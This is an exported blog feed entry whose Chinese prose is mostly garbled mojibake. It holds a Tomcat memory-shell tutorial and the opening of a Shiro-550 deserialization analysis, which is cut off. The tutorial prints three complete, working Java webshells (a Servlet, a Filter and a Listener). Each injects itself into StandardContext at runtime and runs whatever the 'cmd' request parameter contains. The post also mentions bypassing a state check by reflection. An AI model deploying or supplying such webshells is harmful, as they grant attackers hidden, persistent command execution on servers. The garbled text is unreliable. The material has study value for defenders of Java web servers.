    <content type="text"><![CDATA[ÂâçË®ÄÂÜÖÂ≠òÈ©¨‰πãÂâçÊúâÊé•Ëß¶ËøáÔºåÂú®ÈòøÈáåSRCÁöÑÂÆôÊñØÊ¥ªÂä®‰∏≠ËñÖ‰∫ÜÁÇπÁæäÊØõÔºå‰ΩÜÂΩìÊó∂Âè™ÊòØ‰ºöÁî®Ôºå‰∏ç‰∫ÜËß£‰ªñÁöÑÂéüÁêÜ„ÄÇÊú¨ÊñáÈÄöËøáË∞ÉËØïÁöÑÊñπÊ≥ï‰∫ÜËß£ÂÜÖÂ≠òÈ©¨ÁöÑÂéüÁêÜÔºåÂπ∂ÂÆûÁé∞Â∏∏ËßÅÁöÑÂá†ÁßçÂÜÖÂ≠òÈ©¨„ÄÇ ÂâçÁΩÆÁü•ËØÜJava Web‰∏âÂ§ßÁªÑ‰ª∂ServletServletÊòØServer AppletÁöÑÁº©ÂÜôÔºåÂç≥ÊúçÂä°Á´ØÂ∞èÁ®ãÂ∫èÔºåÂèØ‰ª•Êé•Êî∂ÂÆ¢Êà∑Á´ØÂèëÈÄÅÁöÑËØ∑Ê±ÇÔºåÂπ∂Â∞ÜÂìçÂ∫îÊï∞ÊçÆÂèëÈÄÅÂõûÂÆ¢Êà∑Á´Ø„ÄÇServletÊòØJava Web‰∏≠ÊúÄÂ∏∏Áî®ÁöÑ‰∏ÄÁßçÁªÑ‰ª∂ÔºåÂ∞±ÁÆóÂè™Áî®Âà∞‰∫ÜjspÊàñjspxÂºÄÂßãÔºåÂÆûÈôÖ‰∏ä‰πüÁî®Âà∞‰∫ÜServletÔºåÂõ†‰∏∫jspÂíåjspxÊú¨Ë¥®‰∏äÊòØHttpServletÔºåËÄåHttpServletÂèàÊòØServletÁöÑÂ≠êÁ±ª„ÄÇ FilterFilterÂèØ‰ª•Âú®ËØ∑Ê±ÇÂà∞ËææServlet„ÄÅÂìçÂ∫îÂà∞ËææÂÆ¢Êà∑Á´Ø‰πãÂâçÔºåÂØπËØ∑Ê±ÇÊàñÂìçÂ∫îÂÅöÂ§ÑÁêÜÔºåÂõ†Ê≠§ListenerÂ∏∏Ë¢´Áî®Êù•ÂÆûÁé∞ËøáÊª§ÊàñËÆøÈóÆÊéßÂà∂Á≠â„ÄÇ ListenerListenerÊòØÁî®Êù•ÁõëÂê¨Êüê‰∏Ä‰∫ã‰ª∂ÁöÑÔºåÂÖ∑‰ΩìÂèØÂÆûÁé∞ÁªüËÆ°Âú®Á∫øÁî®Êà∑Êï∞„ÄÅËÆøÈóÆÁªüËÆ°Á≠â„ÄÇListenerÁöÑÁßçÁ±ªÂæàÂ§öÔºåÊúâServletContextAttributeListener„ÄÅServletRequestAttributeListener„ÄÅServletRequestListener„ÄÅHttpSessionIdListenerÂíåHttpSessionAttributeListener„ÄÇÂÖ∂‰∏≠ServletRequestListenerÊòØÁî®Êù•ÁõëÂê¨ËØ∑Ê±ÇÁöÑÔºåÂæàÈÄÇÂêàÂÆûÁé∞ÂÜÖÂ≠òÈ©¨„ÄÇ ‰∏§Áßç‰∏ä‰∏ãÊñá‰∏éÂÜÖÂ≠òÈ©¨Áõ∏ÂÖ≥ÁöÑ‰∏§Áßç‰∏ä‰∏ãÊñáÊòØApplicationContextÂíåStandardContext„ÄÇApplicationContextÊòØÂÆûÁé∞ServletContextÁöÑÁ±ªÔºåËÆ∞ÂΩïÁöÑÊòØServletÁöÑ‰∏Ä‰∫õ‰∏ä‰∏ãÊñá‰ø°ÊÅØÔºåËÄåStandardContextËÆ∞ÂΩïÁöÑÊòØÂåÖÊã¨web.xmlÂú®ÂÜÖÁöÑ‰∏Ä‰∫õWebÂ∫îÁî®‰ø°ÊÅØ„ÄÇ Ëá≥‰∫é‰ªÄ‰πàÊòØContextÔºå‰∏™‰∫∫ÁêÜËß£ÊòØ‰∏éÂÆÉÁöÑ‰∏≠ÊñáÊÑèÊÄù‰∏ÄÊ†∑Ôºå‰∏ä‰∏ãÊñáÊàñËØ≠Â¢ÉÔºåÊòØ‰∏ÄÁßçÂ∞èËåÉÂõ¥ÁöÑÁéØÂ¢ÉÂèòÈáèÔºåÂΩìÁÑ∂‰πüÂõ†‰∏∫ÊòØ‰∏Ä‰∏™Á±ªÔºåÊúâÁõ∏Â∫îÁöÑÊúâÊñπÊ≥ïÊìç‰ΩúËøô‰∫õ‰∏ä‰∏ãÊñá‰ø°ÊÅØ„ÄÇ ContextÁöÑËé∑Âèñ‰πüÈúÄË¶ÅÊèê‰∏ÄÊèêÔºåÂõ†‰∏∫ÊòØÂêéÁª≠ÂÜÖÂ≠òÈ©¨ÁöÑÂä†ËΩΩ‰æùËµñ‰∫éStandardContextÔºåÊòØÂÜÖÂ≠òÈ©¨ÁöÑÂÖ≥ÈîÆ„ÄÇÂÖ∂‰∏≠Â∏∏Áî®ÁöÑ‰∏ÄÁßçÊñπÊ≥ïÊòØÈÄöËøáHttpServletRequestÂØπË±°ÁöÑgetServletContextÊñπÊ≥ïËé∑ÂèñServletContextÂØπË±°ÔºåÂÆûÈôÖ‰∏äÊòØÂ∞ÅË£Ö‰∫ÜApplicationContentÁöÑApplicationContextFacadeÔºåËÄåApplicationContextÂèàÊòØtomcat‰∏≠Êó∂ÂÆûÁé∞ServletContextÊé•Âè£ÁöÑÁ±ªÔºåÁÑ∂ÂêéÂÖ∂‰∏≠ÊúâcontextÂ±ûÊÄßÔºåÂ≠òÂÇ®ÁùÄStandardContextÂØπË±°ÔºåÂèØ‰ª•ÈÄöËøáÂèçÂ∞ÑËé∑Âèñ„ÄÇ Â¶ÇÊûúÊ≤°ÊúârequestÁöÑËØùÔºåËøòÂèØ‰ª•‰ªéÁ∫øÁ®ã‰∏≠Ëé∑ÂèñÔºåËØ¶ÁªÜÂàÜÊûêÂèØ‰ª•ÁúãÈïø‰∫≠‰∏Ä‰ΩçÂ∏àÂÇÖÁöÑÊñáÁ´†ÔºöTomcatÁöÑ‰∏ÄÁßçÈÄöÁî®ÂõûÊòæÊñπÊ≥ïÁ†îÁ©∂ÔºåÈô§Ê≠§‰πãÂ§ñËøòÊúâ‰ªéMBean‰∏≠Ëé∑ÂèñÔºå‰ΩÜÁõ∏ÂØπÂ§çÊùÇ‰∏Ä‰∫õ„ÄÇ web.xmlÂä†ËΩΩÂíåTomcatÂêØÂä®ÊµÅÁ®ãË∞ÉËØïÂ§ßÂ§öÊï∞Â∏àÂÇÖÁöÑÂÜÖÂ≠òÈ©¨ÂàÜÊûêÊñáÁ´†ÈÉΩÊòØ‰ªéApplicationContextÁöÑaddServlet„ÄÅaddFilterÂíåaddListenerÊñπÊ≥ï‰∫ÜËß£Java Web‰∏âÂ§ßÁªÑ‰ª∂ÁöÑÂä†ËΩΩÂéüÁêÜÁöÑÔºå‰ΩÜÊú¨Êñá‰ªéweb.xmlÂä†ËΩΩÂíåTomcatÂêØÂä®ÊµÅÁ®ãÁöÑËßíÂ∫¶ÂàÜÊûêÂÜÖÂ≠òÈ©¨ÂéüÁêÜÔºå‰∏çËøáÂÆûË¥®‰∏äÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑÔºåÊúÄÁªà‰øÆÊîπStandardCotextÁöÑÂÜÖÂÆπÂÆûÁé∞ÁöÑ„ÄÇ Êó¢ÁÑ∂ÊòØË∞ÉËØïÔºåË¶ÅÂÖàÂÅö‰∫õÂáÜÂ§áÂ∑•‰ΩúÔºåÂú®IDEA‰∏≠Êñ∞Âª∫‰∏Ä‰∏™Java WebÈ°πÁõÆÂêéÔºåËøòÈúÄÂú®maven‰∏≠Ê∑ªÂä†‰∏™tomcat-embed-coreÁöÑ‰æùËµñÂ¶Ç‰∏ãÔºåÁâàÊú¨ÂàôËÆæÁΩÆ‰∏éÊú¨Âú∞tomcatÁâàÊú¨Áõ∏ÂêåÔºåÊñπ‰æø‰∏ãÊñ≠ÁÇπÂíåË∞ÉËØï„ÄÇ 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt; &lt;version&gt;8.5.71&lt;/version&gt;&lt;/dependency&gt; Áî±‰∫éÂØπtomcatÁöÑÊ∫êÁ†ÅÊ≤°ÊúâÁ†îÁ©∂ÔºåÊâÄ‰ª•Áúü‰∏çÁü•ÈÅìÊÆµÁÇπÂ∫îËØ•Âú®Âì™Èáå‰∏ãÔºåÂ•ΩÂú®Âú®ÁΩë‰∏äÊâæÂà∞ÁØáÊñáÁ´†Âè´TomcatÂ∫îÁî® web.xmlÁöÑÂä†ËΩΩËøáÁ®ã„ÄÇÊñá‰∏≠ÊèêÂà∞web.xmlÁöÑÂä†ËΩΩÂà∞StandardContextÁî±org.apache.catalina.startup.ContextConfigÁ±ªÁöÑconfigureContextÊñπÊ≥ïÂÆûÁé∞„ÄÇ Ê≠§Êó∂Âú®web.xml‰∏≠ÈÖçÁΩÆ‰∏âÂ§ßÁªÑ‰ª∂Â¶Ç‰∏ãÔºåÂπ∂Âú®configureContextÊñπÊ≥ïÂ§Ñ‰∏ãÊÆµÁÇπÂç≥ÂèØÂºÄÂßãË∞ÉËØï„ÄÇ 123456789101112131415161718192021&lt;servlet&gt; &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt; &lt;servlet-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ServletDemo&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt; &lt;url-pattern&gt;/p1ay2win&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;filter&gt; &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt; &lt;filter-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.FilterDemo&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;listener&gt; &lt;listener-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ListenerDemo&lt;/listener-class&gt;&lt;/listener&gt; ‰ΩøÁî®webxmlÂØπË±°Ôºå‰πüÂ∞±ÊòØweb.xmlËß£ÊûêÂêéÁöÑÂÜÖÂÆπÔºåË∞ÉÁî®ÁöÑÊñπÊ≥ïÂêçÂèØÂæóÁü•ÔºåconfigureContextÊñπÊ≥ïÂÖàÂêé‰ΩøÁî®Â±ûÊÄßcontextÔºå‰πüÂ∞±ÊòØStandardContextÁöÑÂÆû‰æãÔºåÊ∑ªÂä†Fiter„ÄÅListenerÂíåServlet„ÄÇ 123456789101112for (ServletDef servlet : webxml.getServlets().values()) &#123; Wrapper wrapper = context.createWrapper(); ... wrapper.setName(servlet.getServletName()); ... wrapper.setServletClass(servlet.getServletClass()); ... context.addChild(wrapper);&#125;for (Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) &#123; context.addServletMappingDecoded(entry.getKey(), entry.getValue());&#125; ÂÖàËØ¥ËØ¥ServletÂä†ËΩΩÁöÑÊµÅÁ®ãÔºåStandardContextÂÆû‰æãÊñ∞Âª∫‰∏Ä‰∏™WrapperÔºåÁÑ∂ÂêéÂ∞ÅË£ÖËøõServletÂêçÂíåServletÁ±ªÂêçÁöÑ‰ø°ÊÅØÔºåÂú®Âä†ÂÖ•‰∏∫StandardContextÁöÑÂ≠êÂÆπÂô®ÔºåËøôÈáåÂØπ‰∫éÁöÑÊòØweb.xml‰∏≠ÁöÑ&lt;servlet&gt;ÔºõÊé•ÁùÄËé∑ÂèñServletMapping‰ø°ÊÅØÔºåÂä†ÂÖ•Âà∞StandardContextÁöÑServletMapping‰∏≠ÔºåÂØπÂ∫îÁöÑÊòØ&lt;servlet-mapping&gt;„ÄÇ Âú®FilterÁöÑÂä†ËΩΩÊµÅÁ®ã‰∏≠ÔºåÂÖàÂêéÂ∞ÜFilterDefÂíåFilterMapÂä†ÂÖ•Âà∞StandardContextÂÆû‰æã‰∏≠ÔºåÂØπÂ∫îÁöÑÊòØ&lt;filter&gt;Âíå&lt;filter-mapping&gt;„ÄÇ Âú®ListenerÁöÑÂä†ËΩΩÊµÅÁ®ã‰∏≠ÔºåÂè™ÈúÄÂ∞ÜfilterÂêçÂä†ÂÖ•Âà∞StandardContextÂÆû‰æãÁöÑapplicationListener‰∏≠„ÄÇ ÊåâÁÖß‰∏äËø∞ÊµÅÁ®ãÔºåÂÜô‰∏Ä‰∏™ServletÁöÑÂÜÖÂ≠òÈ©¨ÊòØÊ≠£Â∏∏ÁöÑÔºåËÄåFilterÂíåListenerÂ∞±Ê≤°ÊúâÁîüÊïàÔºå‰∏éApplicationContextÁöÑaddFilterÂíåaddListenerÊñπÊ≥ïÂíåÊ≠£Â∏∏Âä†ËΩΩweb.xmlÁöÑStandardContextÂÆû‰æãÂØπÊØîÔºåStandardContextÂÆû‰æãÊ≠£Â∏∏ÊÉÖÂÜµ‰∏ãFilterËøòËÆæÁΩÆ‰∫ÜÁöÑfilterConfigÔºåËÄåListenerËøòËÆæÁΩÆ‰∫ÜapplicationEventListener„ÄÇ ÂØπËøô‰∏§‰∏™Â±ûÊÄß‰∏ãÊñ≠ÁÇπÔºåÂä†ËΩΩ‰∫Üweb.xmlÈÖçÁΩÆÂêéÔºåStandardContextÂÆû‰æãËøòÂàÜÂà´Ë∞ÉÁî®listenerStartÂíåfilterStartÊñπÊ≥ïÔºåËÆæÁΩÆ‰∫Ü‰∏äËø∞‰∏§‰∏™Â±ûÊÄßÔºåÊâÄ‰ª•ÂÜÖÂ≠òÈ©¨ÊúÄÁªà‰πüÈúÄË¶ÅË∞ÉÁî®listenerStartÂíåfilterStartÊñπÊ≥ïÊâçÂÆåÊàêListenerÂíåFilterÁöÑÂä†ËΩΩ„ÄÇ ÂÜçËØ¥‰∏Ä‰∏™Â∞ùËØïÂÜôÂÜÖÂ≠òÈ©¨Êó∂ÂÄôÈÅáÂà∞ÁöÑÂùëÔºå‰∏ÄÂºÄÂßã‰πüÂÉèÁΩë‰∏äÂ§ßÂ§öÊï∞ÁöÑ‰æãÂ≠ê‰∏ÄÊ†∑Âú®ÊñπÊ≥ïÈáåÂÆûÁé∞Servlet„ÄÅFilterÂíåListenerÊé•Âè£ÔºåÂπ∂ÂÆû‰æãÂåñÔºõÁÑ∂ÂêéÂÆåÂÖ®ÊåâÁÖßtomcatÂêØÂä®ÊµÅÁ®ãÂä†ËΩΩËøô‰∏â‰∏™ÁªÑ‰ª∂ÁöÑÊó∂ÂÄôÊ≤°ÊïàÊûúÔºåÂú®‰∏Ä‰∏™Êä•ÈîôÈ°µÈù¢‰∏≠ÁúãÂà∞Êó†Ê≥ïÂÆû‰æãÂåñÁöÑÂºÇÂ∏∏ÔºåÂú®StandardContextÂÆû‰æãÁ°ÆÂÆû‰πüÊ≤°ÁúãÂà∞Ëøô‰∏â‰∏™ÁªÑ‰ª∂ÁöÑÂÆû‰æã„ÄÇ‰∫éÊòØ‰ªéStandardContextÁöÑstratInternalÊñπÊ≥ï‰∏ÄÊ≠•‰∏ÄÊ≠•Ë∞ÉÔºåÂèëÁé∞‰ºö‰ΩøÁî®‰º†ÂÖ•ÁöÑ‰∏â‰∏™ÁªÑ‰ª∂ÁöÑÁ±ªÂêçËøõË°åÂÆû‰æãÂåñÔºåÁî±‰∫éÊòØÂú®ÊñπÊ≥ïÈáåÂÆûÁé∞ÁöÑ‰∏â‰∏™ÁªÑ‰ª∂ÁöÑÊé•Âè£Á±ªÔºåËøô‰∏â‰∏™ÁªÑ‰ª∂ÁöÑÁ±ªÂ±û‰∫éÊòØÂÜÖÈÉ®Á±ªÔºåÊâÄ‰ª•ÊôÆÈÄöÁöÑÂèçÂ∞ÑÊ≤°Ê≥ïÂÆû‰æãÂåñËøô‰∏â‰∏™Á±ªÔºåÂØºËá¥Ëøô‰∏â‰∏™ÁªÑ‰ª∂Ê≤°Ê≥ïÊ≠£Â∏∏Âä†ËΩΩ„ÄÇ Â∞èÁªìÊ≠§Â§ÑÂ∞èÁªìÊÄªÁªì‰∏ã‰∏â‰∏™‰∏ªÈîÆÁöÑÂä†ËΩΩÊù°‰ª∂ Servlet WrapperÂ∞ÅË£ÖServletÁöÑ‰ø°ÊÅØ Âä†ÂÖ•WrapperÂà∞StandardContextÁöÑchildren‰∏≠ Filter Âä†ÂÖ•Âà∞StandardContextÁöÑfilterDefs Âä†ÂÖ•Âà∞StandardContextÁöÑfilterMaps Âä†ÂÖ•Âà∞StandardContextÁöÑfilterConfigs Listener Âä†ÂÖ•ListenerÂØπË±°Âà∞StandardContextÁöÑapplicationEventListener‰∏≠ ‰∏âÁßçÂÜÖÂ≠òÈ©¨ÂÆûÁé∞ËøôÈáåÁõ¥Êé•Ë¥¥‰ª£Á†Å‰∫Ü Servlet 12345678910111213141516171819202122232425262728293031package com.p1ay2win.JavaWebMemoryShell.exploit;import org.apache.catalina.Wrapper;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;public class ServletDemo extends HttpServlet &#123; public ServletDemo() &#123; WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); if (standardContext.findServletMapping("/p1ay2win") == null) &#123; Wrapper wrapper = standardContext.createWrapper(); wrapper.setName("p1ay2win"); wrapper.setServletClass(this.getClass().getName()); standardContext.addChild(wrapper); standardContext.addServletMappingDecoded("/p1ay2win", "p1ay2win"); &#125; &#125; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; Runtime.getRuntime().exec("cmd /c" + request.getParameter("cmd")); &#125;&#125; Filter 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.p1ay2win.JavaWebMemoryShell.exploit;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap;import javax.servlet.*;import java.io.IOException;public class FilterDemo implements Filter &#123; public FilterDemo() &#123; WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); if (standardContext.findFilterDef("p1ay2win") == null) &#123; FilterDef filterDef = new FilterDef(); filterDef.setFilterName("p1ay2win"); filterDef.setFilterClass(this.getClass().getName()); standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); filterMap.setFilterName("p1ay2win"); filterMap.addURLPattern("/*"); standardContext.addFilterMap(filterMap); standardContext.filterStart(); &#125; &#125; @Override public void init(FilterConfig filterConfig) &#123; &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; Runtime.getRuntime().exec("cmd /c " + servletRequest.getParameter("cmd")); filterChain.doFilter(servletRequest, servletResponse); &#125; @Override public void destroy() &#123; &#125;&#125; Listener 1234567891011121314151617181920212223242526272829303132333435package com.p1ay2win.JavaWebMemoryShell.exploit;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import javax.servlet.ServletRequestEvent;import javax.servlet.ServletRequestListener;import java.io.IOException;import java.util.Arrays;public class ListenerDemo implements ServletRequestListener &#123; public ListenerDemo() &#123; WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); if (!Arrays.asList(standardContext.findApplicationListeners()).contains(this.getClass().getName())) &#123; standardContext.addApplicationListener(this.getClass().getName()); standardContext.listenerStart(); &#125; &#125; @Override public void requestInitialized(ServletRequestEvent sre) &#123; try &#123; if (sre.getServletRequest().getParameter("cmd") != null) Runtime.getRuntime().exec(sre.getServletRequest().getParameter("cmd")); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void requestDestroyed(ServletRequestEvent sre) &#123; &#125;&#125; ÂÜÖÂ≠òÈ©¨Èô§‰∫Ü‰ΩøÁî®StandardContextËá™Â∏¶ÁöÑÊñπÊ≥ïÂä†ËΩΩÔºåËøòÂèØ‰ΩøÁî®ApplicationContextÁöÑaddServlt„ÄÅaddFilterÂíåaddListenerÊñπÊ≥ïÂä†ËΩΩÔºå‰ΩÜ‰πãÊâÄ‰ª•ÂæàÂ∞ë‰∫∫‰ΩøÁî®ËøôÁßçÊñπÊ≥ïÔºåÊòØÂõ†‰∏∫addXXXÊñπÊ≥ïÈÉΩÊúâ‰∏ãÈù¢ËøôÊÆµ‰ª£Á†ÅÔºåÊ£ÄÊµãËøêË°åÁä∂ÊÄÅÔºå‰∏çÂÖÅËÆ∏ÂàùÂßãÂåñÂêéÂú®Ê∑ªÂä†ÁªÑ‰ª∂„ÄÇ 12345if (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123; throw new IllegalStateException( sm.getString("applicationContext.addXXX.ise", getContextPath()));&#125; Êó¢ÁÑ∂ÊòØÂ±ûÊÄßÔºåËÇØÂÆöÊòØËÉΩÂ§üÈÄöËøáÂèçÂ∞ÑÁöÑÊñπÊ≥ï‰øÆÊîπÂÆÉÁöÑÂÄºÔºåÁÑ∂ÂêéÁªïËøáÊ£ÄÊµãÁöÑÔºå‰ΩÜÊú¨ÊñáÂõ†‰∏∫ÁØáÂπÖÈóÆÈ¢òÂ∞±‰∏çÁªôÂá∫ÂÆûÁé∞‰ª£Á†Å‰∫ÜÔºå‰πüÂõ†‰∏∫Êå∫ÁÆÄÂçïÁöÑÔºåÊúâÂÖ¥Ë∂£ÁöÑÂ∏àÂÇÖÂèØ‰ª•ËØïËØï„ÄÇ ÂêéËÆ∞ËøôÈáåÊèí‰∏™È¢òÂ§ñËØùÔºåË∑ü‰∏Ä‰∏™ÂÆâÂÖ®Á†îÁ©∂ÁöÑÂ∏àÂÖÑËÅäÂ§©ÁöÑÊó∂ÂÄôËÅäÂà∞‰∫ÜÂÜÖÂ≠òÈ©¨ÔºåÊàëÂêë‰ªñËØ∑ÊïôËØ¥‰∏∫‰ªÄ‰πàËØ¥ÊòØÂÜÖÂ≠òÈ©¨Ôºå‰ΩÜCatalinaÁõÆÂΩï‰∏ã‰ºöÁîüÊàêÂÜÖÂ≠òÈ©¨ÁöÑ.classÂíå.javaÊñá‰ª∂Ôºå‰∏çÊòØÊó†Êñá‰ª∂ËêΩÂú∞ÂêóÔºüËøòË∑ü‰ªñÊé¢ËÆ®‰∫Ü‰∏ÄÈòµÂ≠ê„ÄÇÂêéÊù•‰ªñÊÑèËØÜÂà∞ÊàëÊòØÈÄöËøáËÆøÈóÆ‰∏ä‰º†ÁöÑjspÁîüÊàêÁöÑÂÜÖÂ≠òÈ©¨ÔºåËÄåËÆøÈóÆjspÊñá‰ª∂Êó∂tomcatÁöÑÊú∫Âà∂ÊòØÂÖà‰ªéCatalinaÁõÆÂΩï‰∏ãÊâæÊòØÂê¶Â≠òÂú®Ëøô‰∏™Á±ªÔºåÂ¶ÇÊûúÊ≤°ÊúâÂàô‰ºöÊ†πÊçÆjspÊñá‰ª∂ÁîüÊàêHttpServletÁ±ªÂπ∂ÁºñËØëÔºåÊîæÂà∞CatalinaÁõÆÂΩï‰∏ãÔºåÊâÄ‰ª•Âà†Èô§‰∏ä‰º†ÁöÑjspÊñá‰ª∂ÔºåCatalinaÁõÆÂΩï‰∏ãÁõ∏Â∫îÁöÑÂÜÖÂÆπ‰πü‰ºöË¢´Âà†Èô§Ôºå‰ΩÜÁúüÊ≠£ÊÑè‰πâ‰∏äÁöÑÊó†Êñá‰ª∂ËøòÊòØÈÄöËøáÂèçÂ∫èÂàóÂåñÂÆûÁé∞„ÄÇÊÉ≥ÊÉ≥ÈóπËøôÂá∫Á¨ëËØù‰πüÊòØ6Êúà‰ªΩÁöÑÊó∂ÂÄô‰∫ÜÔºåÊÑüÊÖ®Êó∂Èó¥ËøáÂæóÂ•ΩÂø´„ÄÇüòî ÂéüÊú¨ÊâìÁÆóÂú®Êñá‰∏≠‰πüÂä†‰∏äSpringÂÜÖÂ≠òÈ©¨ÁöÑÂÜÖÂÆπÔºåÂ•à‰ΩïSpringÁöÑÂêØÂä®ÊµÅÁ®ãÊØîTomcatÂ§çÊùÇÂ§™Â§öÔºåTomcatÁöÑË∞ÉËØï‰πüÊêûÂæóÊàëÂ§üÂëõÁöÑ‰∫ÜÔºåSpringÁöÑÂÜÖÂÆπËøòÊòØÁïôÂú®ÂêéÁª≠ÂÜçÁ†îÁ©∂Âêß„ÄÇÈÄöËøáËøôÊ¨°Â≠¶‰π†ÔºåÊÑüËßâJavaÂÆâÂÖ®Ë∑ü‰ª£Á†ÅÁöÑÁõ∏ÂÖ≥ÊÄßÂæàÂº∫„ÄÇÂä†Ê≤πÂêßÔºåÈ™öÂπ¥ ÂèÇËÄÉhttps://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect%EF%BC%88%EF%BC%89 https://www.freebuf.com/articles/web/274466.html https://su18.org/post/memory-shell/ https://github.com/bitterzzZZ/MemoryShellLearn https://landgrey.me/blog/12/ https://www.freebuf.com/articles/web/274466.html https://www.cnblogs.com/colin-xun/p/10573504.html https://blog.csdn.net/lblblblblzdx/article/details/80946526]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂÜÖÂ≠òÈ©¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ê≤°‰ªÄ‰πàÂ•ΩÂàÜÊûêÁöÑShiro-550]]></title>
    <url>%2F2021%2F09%2F14%2F%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A5%BD%E5%88%86%E6%9E%90%E7%9A%84Shiro-550%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÈôÜÈôÜÁª≠Áª≠ÂàÜÊûê‰∫ÜÂá†‰∏™JavaÁöÑÂÆâÂÖ®ÊºèÊ¥ûÔºåÊé•‰∏ãÊù•ËΩÆÂà∞shiroÁöÑ‰∫Ü„ÄÇËøôÈáåÂàÜÊûêÁöÑÊòØShiro-550ÔºåÁ°¨ÁºñÁ†ÅrememberMeÂØÜÈí•ÈÄ†ÊàêÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇÂàÜÊûêËµ∑Êù•ÊØîÊÉ≥Ë±°ÁùÄÁöÑÁÆÄÂçï„ÄÇ ÁéØÂ¢ÉÊê≠Âª∫Shiro-550ÊòØ‰ΩøÁî®shiro1.2.4Âèä‰ª•‰∏ãÁöÑÈªòËÆ§ÂØÜÈí•ÂØºËá¥ÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÁéØÂ¢ÉÁöÑ‰ª£Á†ÅÊàëÊòØÁî®ÁöÑgithub‰∏ä‰∏Ä‰∏™Â§ß‰Ω¨ÂÜôÁöÑÔºå‰ΩøÁî®ÁöÑÊòØMavenÂåÖÁÆ°ÁêÜÔºå‰∏çÁî®ÊÄé‰πàÊê≠ÔºåËá™Âä®‰∏ãËΩΩ‰æùËµñÁõ¥Êé•ËøêË°åÂç≥ÂèØ„ÄÇ ÊºèÊ¥ûË∞ÉËØïÊ†πÊçÆÁΩë‰∏äÂ§ßÈÉ®ÂàÜÁöÑÂ§çÁé∞ÊñáÁ´†Ôºå‰ΩøÁî®ysoserialÁîüÊàêCommonsBeanutils1ÂèçÂ∫èÂàóÂåñÈìæÁöÑpayloadÔºåÂπ∂‰ΩøÁî®‰∏äÈù¢shiroÊºèÊ¥ûÁéØÂ¢ÉÈ°πÁõÆÁöÑGenPayloadÁ±ªÂä†ÂØÜ‰∏Ä‰∏ãpayloadÔºåÁîüÊàêshiroÂèØËØÜÂà´ÁöÑrememberMeÂÜÖÂÆπ„ÄÇ ÁÑ∂Âêé‰æùÊóßÊòØÂú®RuntimeÁöÑexecÊñπÊ≥ï‰∏ãÊñ≠ÁÇπÔºåCookie‰∏≠ËÆæÁΩÆrememberMeÂπ∂ÂèëÈÄÅ„ÄÇË∞ÉÁî®Ê†àÊå∫ÈïøÁöÑÔºå‰ΩÜË∑ürememberMeÊúâÂÖ≥ÁöÑÊòØ‰ªéAbstractRememberMeManagerÂºÄÂßãËøôÊÆµ„ÄÇ Ë∑üËøõÂà∞AbstractRememberMeManagerÁöÑgetRememberedPrincipalsÊñπÊ≥ï„ÄÇÁúãÂà∞bytesÂèòÈáèÁöÑÂÜÖÂÆπ‰∏∫Âä†ÂØÜÂêéÁöÑÂ∫èÂàóÂåñÈìæÔºåË∑üËøõgetRememberedSerializedIdentityÊñπÊ≥ïÁúãÁúãÊòØÂ¶Ç‰ΩïËé∑ÂèñrememberMeÂÜÖÂÆπÁöÑ„ÄÇ 